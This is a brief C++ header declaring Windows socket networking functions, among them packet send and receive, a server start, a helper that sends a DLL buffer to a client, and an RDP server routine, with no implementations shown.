#pragma once
#include"Globals.h"
#define MAXPACK 10000000 // 10MB
namespace net {

	BOOL init();
	int pktSend(SOCKET s, char* buff, int sz, char type);
	SOCKET SrvStart(unsigned short port);
	BOOL recvp(SOCKET s, char* buffer, int maxsz, _Out_ int* p_size);
	_inline int DllSend(SOCKET client, char* dll, int sz) {

		return net::pktSend(client, dll, sz, 0x10);
	}
	void RDPServer(SOCKET client);
}